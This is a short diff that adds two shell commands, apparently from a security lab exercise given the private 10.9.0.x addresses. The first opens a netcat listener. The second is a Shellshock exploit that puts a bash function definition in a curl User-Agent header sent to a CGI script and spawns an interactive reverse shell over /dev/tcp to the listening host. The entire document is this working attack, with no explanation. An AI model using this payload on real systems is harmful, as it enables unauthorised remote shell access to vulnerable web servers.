@@ -1,0 +1,4 @@
+nc -lvn 9090
+
+curl -A '() { echo "a";}; echo Content_type:text/plain; echo; /bin/bash -i &> /dev/tcp/10.9.0.1/9090 0<&1' http://10.9.0.80/cgi-bin/getenv.cgi
+
